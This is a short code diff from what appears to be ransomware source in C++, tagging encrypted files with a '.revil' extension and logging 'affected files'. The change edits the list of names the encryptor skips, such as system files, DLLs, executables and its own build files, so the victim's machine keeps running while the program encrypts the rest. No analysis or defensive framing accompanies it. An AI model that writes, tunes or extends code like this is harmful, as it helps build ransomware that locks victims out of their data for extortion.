@@ -82,7 +82,7 @@ const std::vector<std::string> ENCRYPTED_EXTENSIONS = { ".revil" };
 
 const std::vector<std::string> EXCLUDE_KEYWORDS = {
     "winlogon.exe", ".dll", ".sys", ".exe", ".ini", "pagefile.sys", "hiberfil.sys",
-    "rs", "rs.cpp", "rs_debug", "generate_keys", "config.h"
+    "config.h", "collect"
 };
 
 const std::string LOG_FILE = "affected_files.log";
